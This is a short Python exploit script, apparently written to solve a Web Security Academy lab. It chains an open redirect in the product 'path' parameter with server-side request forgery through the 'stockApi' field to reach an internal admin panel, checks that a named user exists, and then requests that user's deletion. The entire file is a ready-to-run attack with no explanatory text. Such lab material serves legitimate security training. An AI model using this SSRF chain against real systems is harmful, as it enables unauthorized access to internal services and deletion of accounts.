#!/usr/bin/python3
import requests
import sys
import urllib3
import urllib.parse

def check_user(username):
    host = "https://0aeb005003510c5181c5176c003000a5.web-security-academy.net/product/stock"
    open_redirection_vuln = "/product/nextProduct?currentProductId=1&path="
    target_server = "http://192.168.0.12:8080/admin"
    payload = urllib.parse.quote(open_redirection_vuln + target_server)

    data = {
        "stockApi": payload
    }
    
    res = requests.post(host, data=data)
    if username in res.text:
        print(f"[*] Found user {username}")
        print("[*] Exploiting.....")
        return True
    else:
        print("[-] The specefied username does not exist.")
        return False

def exploit(username):
    host = "https://0aeb005003510c5181c5176c003000a5.web-security-academy.net/product/stock"
    open_redirection_vuln = "/product/nextProduct?currentProductId=1&path="
    target_server = "http://192.168.0.12:8080/admin/delete?username="
    payload = urllib.parse.quote(open_redirection_vuln + target_server + username)
    data = {
        "stockApi": payload
    }
    res = requests.post(host, data=data)
    if username not in res.text:
        print("[+] User deleted.")
        print("[+] Exploit completed successfuly!")



def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <username>")
        quit()
    if check_user(sys.argv[1]):
        exploit(sys.argv[1])
    else:
        quit()



if __name__ == "__main__":
    main()
